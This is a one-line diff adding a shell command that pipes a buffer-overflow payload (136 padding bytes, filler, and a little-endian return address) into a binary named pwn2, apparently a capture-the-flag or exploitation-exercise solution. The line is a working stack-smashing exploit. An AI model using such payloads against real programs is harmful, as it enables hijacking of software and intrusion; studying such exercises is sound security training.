@@ -1,0 +1,1 @@
+python -c 'print "A"*136 + "\x11\x11\x11\x11" + "\x4b\x85\x04\x08"' | ./pwn2 
